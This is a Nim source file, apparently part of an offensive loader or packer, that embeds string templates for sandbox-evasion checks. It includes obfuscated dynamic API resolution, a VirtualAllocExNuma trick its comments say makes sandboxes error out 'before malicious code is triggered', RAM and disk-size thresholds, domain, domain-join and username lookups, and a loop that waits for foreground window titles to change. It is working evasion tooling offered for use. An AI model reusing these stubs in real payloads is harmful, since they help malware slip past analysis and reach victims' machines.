
let DInvokeSandBoxStub * = """



type
  GetComputerNameExA_t* = proc (nameType: cint, name: cstring, len: PDWORD): WINBOOL {.stdcall.}
  GlobalMemoryStatusEx_t* = proc (lpBuffer: LPMEMORYSTATUSEX): WINBOOL {.stdcall.}
  GetDiskFreeSpaceExA_t* = proc (lpDirectoryName: LPCSTR, lpFreeBytesAvailableToCaller: PULARGE_INTEGER, lpTotalNumberOfBytes: PULARGE_INTEGER, lpTotalNumberOfFreeBytes: PULARGE_INTEGER): WINBOOL {.stdcall.}

const
  GetComputerNameExA_HASH * = obf("GetComputerNameExA")
  GlobalMemoryStatusEx_HASH * = obf("GlobalMemoryStatusEx")
  GetDiskFreeSpaceExA_HASH * = obf("GetDiskFreeSpaceExA")

var MyGetComputerNameExA*: GetComputerNameExA_t
var MyGlobalMemoryStatusEx*: GlobalMemoryStatusEx_t
var MyGetDiskFreeSpaceExA*: GetDiskFreeSpaceExA_t

MyGetComputerNameExA = cast[GetComputerNameExA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetComputerNameExA_HASH, 0, FALSE)))

MyGlobalMemoryStatusEx = cast[GlobalMemoryStatusEx_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GlobalMemoryStatusEx_HASH, 0, FALSE)))

MyGetDiskFreeSpaceExA = cast[GetDiskFreeSpaceExA_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetDiskFreeSpaceExA_HASH, 0, FALSE))


"""

let VirtualAlloxExNumaCheckStub * = """
from bitops import bitor
# Stolen from @chvancooten
# Try to evade sandboxes by calling an obscure API and checking the result
# Some sandboxes do not emulate this API, causing it to error out before malicious code is triggered
proc obscureApi*(): void =
    let 
        mem = VirtualAllocExNuma(-1, NULL,
            0x1000, bitor(MEM_COMMIT, MEM_RESERVE),
            PAGE_EXECUTE_READ, 0)

    if isNil(mem):
        # Sandbox alert! ;)
        when defined(verbose):
            echo obf("[-] ERROR: I don't trust this here environment... Goodbye!")
        quit(1)
    
    # We good otherwise
    when defined(verbose):
        echo obf("[*] We don't appear to be in a sandbox")

when isMainModule:
    obscureApi()

"""

let DomainCheckStub * = """

# code modified from here -> https://github.com/rominf/nim-hostname/blob/d517210adedf7f6c708393ddd20fd7a93504f262/src/hostname.nim
when defined(windows):
  # https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ne-sysinfoapi-computer_name_format
  const ComputerNameDnsDomain = 2
  # For testing purposes only
  const ComputerNameDnsFullyQualified = 3
elif defined(posix):
  import posix

proc getDomain*(): string =
  ## Returns domain name only.
  ## On Windows (see
  ## https://docs.microsoft.com/en-us/windows/win32/sysinfo/computer-names)
  ## returns ComputerNamePhysicalDnsHostname.
  # On POSIX SUSv2 guarantees that "Host names are limited to 255 bytes".
  # https://tools.ietf.org/html/rfc1035#section-2.3.1
  # https://tools.ietf.org/html/rfc2181#section-11
  const size = 256
  result = newString(size)
  when defined(windows):
    var resultLen: DWORD = DWORD(size)
    when defined(DInvoke):
        let success = MyGetComputerNameExA(ComputerNameDnsDomain,result.cstring, resultLen.addr) != 0
    else:
        let success = GetComputerNameExA(ComputerNameDnsDomain,result.cstring, resultLen.addr) != 0
  if not success:
      when defined(verbose):
        echo obf("Failed to get Domain")
  else:
      when defined(verbose):
        echo obf("Domain: ") & result
  result.setLen(resultLen)

"""

let UsernameCheckStub * = """
# this function will enumerate the current username via Win32 API

proc getUsername*(): string =
    var
        username: string
        size: DWORD = 0
    
    discard GetUserNameA(nil, addr size)
    username = newString(size)
    discard GetUserNameA(username.cstring, addr size)
    when defined(verbose):
        echo obf("Username: ") & username
    # remove 0x00 from username
    username = username[0 ..< size - 1]
    # make everything lowercase
    username = username.toLower
    result = username

"""

let MemorySpaceStub * = """

from winim import GlobalMemoryStatusEx,DWORD,MEMORYSTATUSEX

var statex: MEMORYSTATUSEX

proc MemoryCheck*(): bool =
    var gofurther: bool = false

    statex.dwLength = cast[DWORD](sizeof(statex))
    when defined(DInvoke):
        discard MyGlobalMemoryStatusEx(addr statex)
    else:
        discard GlobalMemoryStatusEx(addr statex)
    var totalPhys = float(statex.ullTotalPhys) / float(1024*1024*1024)
    # If more than 4GB RAM available return true
    if(totalPhys >= 3.8):
        gofurther = true
        return gofurther
    else:
        return gofurther

when isMainModule:
    if (MemoryCheck() == false):
        when defined(verbose):
            echo obf("Not enough memory")
        quit()

"""


let DiskSpaceStub * = """

from winim import GetDiskFreeSpaceEx,ULARGE_INTEGER,NTSTATUS
import winim/winstr

proc DiskSizeCheck*(): bool =

    var
        uliUserFree: ULARGE_INTEGER
        uliTotal: ULARGE_INTEGER
        uliRealFree: ULARGE_INTEGER
        success: NTSTATUS
        result: float
        gofurther: bool

    when defined(DInvoke):
        success = MyGetDiskFreeSpaceExA("C:\\",addr uliUserFree, addr uliTotal, addr uliRealFree)
    else:
        success = GetDiskFreeSpaceEx("C:\\",addr uliUserFree, addr uliTotal, addr uliRealFree)
    result = float(uliTotal.QuadPart) / float((1024*1024*1024))
    when defined(verbose):
        echo "Size in GB: " & $result
    if(result >= 200):
        gofurther = true
        return gofurther
    else:
        return gofurther

when isMainModule:
    if (DiskSizeCheck() == false):
        when defined(verbose):
            echo obf("Disk too small")
        quit()

"""

let WindowChangeStub * = """

# Credit: Idea from @Mr-Un1k0d3r

from winim/inc/windef import LPWSTR
from winim/inc/windef import WCHAR
from winim/inc/windef import HWND
from winim/inc/winuser import GetForegroundWindow
from winim/inc/winuser import GetWindowTextW
from winim/winstr import winstrConverterWStringToLPWSTR
from winim/winstr import newWString
from winim/winstr import `$`

var MIN_COUNT = 15
var counter = 0
var current*: WCHAR

proc evade *(): void =
  while counter <= MIN_COUNT:
    var title: LPWSTR = newWString(256)
    var hwnd: HWND = GetForegroundWindow()
    if hWnd != 0:
        GetWindowTextW(hWnd, title, 256)
    if (title[] != current):
      when defined(verbose):
        echo "Title changed to: ", $title
      current = title[]
      inc counter
      when defined(verbose):
        echo "Increased counter to: ", counter


when isMainModule:
    evade()

"""

let DomainJoinStub * = """
# This will check for ANY domain join
from winim/com import GetObject
try:
    discard GetObject(obf("LDAP://RootDSE"))
except:
    quit()
finally:
    when defined(verbose):
        echo ""
"""